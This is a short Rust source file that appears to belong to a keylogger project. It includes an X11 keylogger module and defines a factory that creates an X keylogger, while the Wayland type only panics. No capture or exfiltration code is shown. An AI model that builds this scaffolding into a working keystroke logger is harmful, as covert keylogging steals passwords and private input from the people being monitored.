include!("./X_keylogger.rs");

pub enum KeyloggerTypes {
    X, 
    Wayland,
}

pub trait KeyloggerFact {
    fn create_keylogger(&self, ktype: KeyloggerTypes) -> Box<dyn Keylogger>;
}


pub struct KeyloggerFactory;

impl KeyloggerFact for KeyloggerFactory {
    fn create_keylogger(&self, ktype: KeyloggerTypes) -> Box<dyn Keylogger> {
        match ktype {
            KeyloggerTypes::X {} => Box::new(XKeylogger::new() ),
            _ => panic!("unsporrted keylogger type")
        }
    }
}
